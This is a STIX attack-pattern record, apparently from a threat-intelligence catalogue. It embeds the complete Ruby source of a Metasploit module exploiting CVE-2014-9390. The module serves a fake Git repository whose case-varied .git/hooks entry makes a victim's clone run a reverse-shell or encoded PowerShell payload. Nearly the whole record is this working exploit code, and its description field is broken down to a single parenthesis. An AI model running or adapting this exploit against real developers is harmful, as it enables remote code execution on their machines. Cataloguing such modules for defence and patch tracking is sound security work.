{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--48074df9-93a2-499c-9d8e-a2d1ef8d2b02",
    "created": "2024-08-14T17:10:26.024306Z",
    "modified": "2024-08-14T17:10:26.024311Z",
    "name": "Malicious Git and Mercurial HTTP Server For CVE-2014-9390",
    "description": "(",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/git_client_command_exec.rb",
            "external_id": "git_client_command_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-9390"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2015/01/01/12-days-of-haxmas-exploiting-cve-2014-9390-in-git-and-mercurial"
        },
        {
            "source_name": "reference",
            "url": "http://git-blame.blogspot.com.es/2014/12/git-1856-195-205-214-and-221-and.html"
        },
        {
            "source_name": "reference",
            "url": "http://article.gmane.org/gmane.linux.kernel/1853266"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/blog/1938-vulnerability-announced-update-your-git-clients"
        },
        {
            "source_name": "reference",
            "url": "https://www.mehmetince.net/one-git-command-may-cause-you-hacked-cve-2014-9390-exploitation-for-shell/"
        },
        {
            "source_name": "reference",
            "url": "http://mercurial.selenic.com/wiki/WhatsNew#Mercurial_3.2.3_.282014-12-18.29"
        },
        {
            "source_name": "reference",
            "url": "http://selenic.com/repo/hg-stable/rev/c02a05cc6f5e"
        },
        {
            "source_name": "reference",
            "url": "http://selenic.com/repo/hg-stable/rev/6dad422ecc5a"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::Git\n  include Msf::Exploit::Powershell\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name' => 'Malicious Git and Mercurial HTTP Server For CVE-2014-9390',\n      'Description' => %q(\n        This module exploits CVE-2014-9390, which affects Git (versions less\n        than 1.8.5.6, 1.9.5, 2.0.5, 2.1.4 and 2.2.1) and Mercurial (versions\n        less than 3.2.3) and describes three vulnerabilities.\n\n        On operating systems which have case-insensitive file systems, like\n        Windows and OS X, Git clients can be convinced to retrieve and\n        overwrite sensitive configuration files in the .git\n        directory which can allow arbitrary code execution if a vulnerable\n        client can be convinced to perform certain actions (for example,\n        a checkout) against a malicious Git repository.\n\n        A second vulnerability with similar characteristics also exists in both\n        Git and Mercurial clients, on HFS+ file systems (Mac OS X) only, where\n        certain Unicode codepoints are ignorable.\n\n        The third vulnerability with similar characteristics only affects\n        Mercurial clients on Windows, where Windows \"short names\"\n        (MS-DOS-compatible 8.3 format) are supported.\n\n        Today this module only truly supports the first vulnerability (Git\n        clients on case-insensitive file systems) but has the functionality to\n        support the remaining two with a little work.\n      ),\n      'License' => MSF_LICENSE,\n      'Author' => [\n        'Jon Hart <jon_hart[at]rapid7.com>' # metasploit module\n      ],\n      'References'     =>\n        [\n          ['CVE', '2014-9390'],\n          ['URL', 'https://www.rapid7.com/blog/post/2015/01/01/12-days-of-haxmas-exploiting-cve-2014-9390-in-git-and-mercurial'],\n          ['URL', 'http://git-blame.blogspot.com.es/2014/12/git-1856-195-205-214-and-221-and.html'],\n          ['URL', 'http://article.gmane.org/gmane.linux.kernel/1853266'],\n          ['URL', 'https://github.com/blog/1938-vulnerability-announced-update-your-git-clients'],\n          ['URL', 'https://www.mehmetince.net/one-git-command-may-cause-you-hacked-cve-2014-9390-exploitation-for-shell/'],\n          ['URL', 'http://mercurial.selenic.com/wiki/WhatsNew#Mercurial_3.2.3_.282014-12-18.29'],\n          ['URL', 'http://selenic.com/repo/hg-stable/rev/c02a05cc6f5e'],\n          ['URL', 'http://selenic.com/repo/hg-stable/rev/6dad422ecc5a']\n\n        ],\n      'DisclosureDate' => '2014-12-18',\n      'Targets' =>\n        [\n          [\n            'Automatic',\n            {\n              'Platform' => [ 'unix' ],\n              'Arch'     => ARCH_CMD,\n              'Payload'        =>\n                {\n                  'Compat'      =>\n                    {\n                      'PayloadType' => 'cmd cmd_bash',\n                      'RequiredCmd' => 'generic bash-tcp perl'\n                    }\n                }\n            }\n          ],\n          [\n            'Windows Powershell',\n            {\n              'Platform' => [ 'windows' ],\n              'Arch'     => [ARCH_X86, ARCH_X64]\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'Notes' =>\n        {\n          'Stability' => [ CRASH_SAFE ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, SCREEN_EFFECTS ]\n        }))\n\n    register_options(\n      [\n        OptBool.new('GIT', [true, 'Exploit Git clients', true])\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptString.new('GIT_URI', [false, 'The URI to use as the malicious Git instance (empty for random)', '']),\n        OptString.new('MERCURIAL_URI', [false, 'The URI to use as the malicious Mercurial instance (empty for random)', '']),\n        OptString.new('GIT_HOOK', [false, 'The Git hook to use for exploitation', 'post-checkout']),\n        OptString.new('MERCURIAL_HOOK', [false, 'The Mercurial hook to use for exploitation', 'update']),\n        OptBool.new('MERCURIAL', [false, 'Enable experimental Mercurial support', false])\n      ]\n    )\n  end\n\n  def setup\n    # the exploit requires that we act enough like a real Mercurial HTTP instance,\n    # so we keep a mapping of all of the files and the corresponding data we'll\n    # send back along with a trigger file that signifies that the git/mercurial\n    # client has fetched the malicious content.\n    @repo_data = {\n      git: { files: {}, trigger: nil },\n      mercurial: { files: {}, trigger: nil }\n    }\n\n    unless datastore['GIT'] || datastore['MERCURIAL']\n      fail_with(Failure::BadConfig, 'Must specify at least one GIT and/or MERCURIAL')\n    end\n\n    setup_git\n    setup_mercurial\n\n    super\n  end\n\n  def setup_git\n    return unless datastore['GIT']\n    # URI must start with a /\n    unless git_uri && git_uri =~ /^\\//\n      fail_with(Failure::BadConfig, 'GIT_URI must start with a /')\n    end\n    # sanity check the malicious hook:\n    if datastore['GIT_HOOK'].blank?\n      fail_with(Failure::BadConfig, 'GIT_HOOK must not be blank')\n    end\n\n    # In .git/hooks/ directory, specially named files are shell scripts that\n    # are executed when particular events occur.  For example, if\n    # .git/hooks/post-checkout was an executable shell script, a git client\n    # would execute that file every time anything is checked out.  There are\n    # various other files that can be used to achieve similar goals but related\n    # to committing, updating, etc.\n    #\n    # This vulnerability allows a specially crafted file to bypass Git's\n    # blacklist and overwrite the sensitive .git/hooks/ files which can allow\n    # arbitrary code execution if a vulnerable Git client can be convinced to\n    # interact with a malicious Git repository.\n    #\n    # This builds a fake git repository using the knowledge from:\n    #\n    #   http://schacon.github.io/gitbook/7_how_git_stores_objects.html\n    #   http://schacon.github.io/gitbook/7_browsing_git_objects.html\n    case target.name\n    when 'Automatic'\n      full_cmd = \"#!/bin/sh\\n#{payload.encoded}\\n\"\n    when 'Windows Powershell'\n      psh = cmd_psh_payload(payload.encoded,\n                            payload_instance.arch.first,\n                            remove_comspec: true,\n                            encode_final_payload: true)\n      full_cmd = \"#!/bin/sh\\n#{psh}\"\n    end\n\n    blob_obj = GitObject.build_blob_object(full_cmd)\n    trigger = \"/objects/#{blob_obj.path}\"\n    @repo_data[:git][:trigger] = trigger\n    @repo_data[:git][:files][trigger] = blob_obj.compressed\n    # build tree that points to the blob\n    blob_tree_ent = { mode: '100755', file_name: datastore['GIT_HOOK'], sha1: blob_obj.sha1 }\n    blob_tree_ptr = GitObject.build_tree_object(blob_tree_ent)\n    @repo_data[:git][:files][\"/objects/#{blob_tree_ptr.path}\"] = blob_tree_ptr.compressed\n    # build a tree that points to the hooks directory in which the hook lives, called hooks\n    hooks_ent = { mode: '40000', file_name: 'hooks', sha1: blob_tree_ptr.sha1 }\n    hooks_obj = GitObject.build_tree_object(hooks_ent)\n    @repo_data[:git][:files][\"/objects/#{hooks_obj.path}\"] = hooks_obj.compressed\n    # build a tree that points to the partially uppercased .git directory in\n    # which hooks live\n    variants = []\n    %w(g G). each do |g|\n      %w(i I).each do |i|\n        %w(t T).each do |t|\n          git = g + i + t\n          variants << git unless git.chars.none? { |c| c == c.upcase }\n        end\n      end\n    end\n    git_dir = '.' + variants.sample\n    git_tree_ent = { mode: '40000', file_name: git_dir, sha1: hooks_obj.sha1 }\n    git_tree_obj = GitObject.build_tree_object(git_tree_ent)\n    @repo_data[:git][:files][\"/objects/#{git_tree_obj.path}\"] = git_tree_obj.compressed\n\n    commit_obj = GitObject.build_commit_object(tree_sha1: git_tree_obj.sha1)\n    if datastore['VERBOSE']\n      vprint_status(\"Malicious Git commit of #{git_dir}/#{datastore['GIT_HOOK']} is:\")\n      commit_obj.content.each_line { |l| vprint_status(l.strip) }\n    end\n    @repo_data[:git][:files][\"/objects/#{commit_obj.path}\"] = commit_obj.compressed\n    # build HEAD\n    @repo_data[:git][:files]['/HEAD'] = \"ref: refs/heads/master\\n\"\n    # lastly, build refs\n    @repo_data[:git][:files]['/info/refs'] = \"#{commit_obj.sha1}\\trefs/heads/master\\n\"\n  end\n\n  def setup_mercurial\n    return unless datastore['MERCURIAL']\n    # URI must start with a /\n    unless mercurial_uri && mercurial_uri =~ /^\\//\n      fail_with(Failure::BadConfig, 'MERCURIAL_URI must start with a /')\n    end\n    # sanity check the malicious hook\n    if datastore['MERCURIAL_HOOK'].blank?\n      fail_with(Failure::BadConfig, 'MERCURIAL_HOOK must not be blank')\n    end\n    # we fake the Mercurial HTTP protocol such that we are compliant as possible but\n    # also as simple as possible so that we don't have to support all of the protocol\n    # complexities.  Taken from:\n    #   http://mercurial.selenic.com/wiki/HttpCommandProtocol\n    #   http://selenic.com/hg/file/tip/mercurial/wireproto.py\n    @repo_data[:mercurial][:files]['?cmd=capabilities'] = 'heads getbundle=HG10UN'\n    fake_sha1 = 'e6c39c507d7079cfff4963a01ea3a195b855d814'\n    @repo_data[:mercurial][:files]['?cmd=heads'] = \"#{fake_sha1}\\n\"\n    # TODO: properly bundle this using the information in http://mercurial.selenic.com/wiki/BundleFormat\n    @repo_data[:mercurial][:files][\"?cmd=getbundle&common=#{'0' * 40}&heads=#{fake_sha1}\"] = Zlib::Deflate.deflate(\"HG10UNfoofoofoo\")\n\n    # TODO: finish building the fake repository\n  end\n\n  def exploit\n    super\n  end\n\n  def primer\n    # add the git and mercurial URIs as necessary\n    if datastore['GIT']\n      hardcoded_uripath(git_uri)\n      print_status(\"Malicious Git URI is #{URI.parse(get_uri).merge(git_uri)}\")\n    end\n    if datastore['MERCURIAL']\n      hardcoded_uripath(mercurial_uri)\n      print_status(\"Malicious Mercurial URI is #{URI.parse(get_uri).merge(mercurial_uri)}\")\n    end\n  end\n\n  # handles routing any request to the mock git, mercurial or simple HTML as necessary\n  def on_request_uri(cli, req)\n    # if the URI is one of our repositories and the user-agent is that of git/mercurial\n    # send back the appropriate data, otherwise just show the HTML version\n    if (user_agent = req.headers['User-Agent'])\n      if datastore['GIT'] && user_agent =~ /^git\\// && req.uri.start_with?(git_uri)\n        do_git(cli, req)\n        return\n      elsif datastore['MERCURIAL'] && user_agent =~ /^mercurial\\// && req.uri.start_with?(mercurial_uri)\n        do_mercurial(cli, req)\n        return\n      end\n    end\n\n    do_html(cli, req)\n  end\n\n  # simulates a Git HTTP server\n  def do_git(cli, req)\n    # determine if the requested file is something we know how to serve from our\n    # fake repository and send it if so\n    req_file = URI.parse(req.uri).path.gsub(/^#{git_uri}/, '')\n    if @repo_data[:git][:files].key?(req_file)\n      vprint_status(\"Sending Git #{req_file}\")\n      send_response(cli, @repo_data[:git][:files][req_file])\n      if req_file == @repo_data[:git][:trigger]\n        vprint_status(\"Trigger!\")\n        # Do we need this?  If so, how can I update the payload which is in a file which\n        # has already been built?\n        # regenerate_payload\n        handler(cli)\n      end\n    else\n      vprint_status(\"Git #{req_file} doesn't exist\")\n      send_not_found(cli)\n    end\n  end\n\n  # simulates an HTTP server with simple HTML content that lists the fake\n  # repositories available for cloning\n  def do_html(cli, _req)\n    resp = create_response\n    resp.body = <<HTML\n     <html>\n      <head><title>Public Repositories</title></head>\n      <body>\n        <p>Here are our public repositories:</p>\n        <ul>\nHTML\n\n    if datastore['GIT']\n      this_git_uri = URI.parse(get_uri).merge(git_uri)\n      resp.body << \"<li><a href=#{git_uri}>Git</a> (clone with `git clone #{this_git_uri}`)</li>\"\n    else\n      resp.body << \"<li><a>Git</a> (currently offline)</li>\"\n    end\n\n    if datastore['MERCURIAL']\n      this_mercurial_uri = URI.parse(get_uri).merge(mercurial_uri)\n      resp.body << \"<li><a href=#{mercurial_uri}>Mercurial</a> (clone with `hg clone #{this_mercurial_uri}`)</li>\"\n    else\n      resp.body << \"<li><a>Mercurial</a> (currently offline)</li>\"\n    end\n    resp.body << <<HTML\n        </ul>\n      </body>\n    </html>\nHTML\n\n    cli.send_response(resp)\n  end\n\n  # simulates a Mercurial HTTP server\n  def do_mercurial(cli, req)\n    # determine if the requested file is something we know how to serve from our\n    # fake repository and send it if so\n    uri = URI.parse(req.uri)\n    req_path = uri.path\n    req_path += \"?#{uri.query}\" if uri.query\n    req_path.gsub!(/^#{mercurial_uri}/, '')\n    if @repo_data[:mercurial][:files].key?(req_path)\n      vprint_status(\"Sending Mercurial #{req_path}\")\n      send_response(cli, @repo_data[:mercurial][:files][req_path], 'Content-Type' => 'application/mercurial-0.1')\n      if req_path == @repo_data[:mercurial][:trigger]\n        vprint_status(\"Trigger!\")\n        # Do we need this?  If so, how can I update the payload which is in a file which\n        # has already been built?\n        # regenerate_payload\n        handler(cli)\n      end\n    else\n      vprint_status(\"Mercurial #{req_path} doesn't exist\")\n      send_not_found(cli)\n    end\n  end\n\n  # Returns the value of GIT_URI if not blank, otherwise returns a random .git URI\n  def git_uri\n    return @git_uri if @git_uri\n    if datastore['GIT_URI'].blank?\n      @git_uri = '/' + Rex::Text.rand_text_alpha(rand(10) + 2).downcase + '.git'\n    else\n      @git_uri = datastore['GIT_URI']\n    end\n  end\n\n  # Returns the value of MERCURIAL_URI if not blank, otherwise returns a random URI\n  def mercurial_uri\n    return @mercurial_uri if @mercurial_uri\n    if datastore['MERCURIAL_URI'].blank?\n      @mercurial_uri = '/' + Rex::Text.rand_text_alpha(rand(10) + 6).downcase\n    else\n      @mercurial_uri = datastore['MERCURIAL_URI']\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2014-12-18",
    "x_mitre_platforms": [
        "[ 'windows' ]"
    ]
}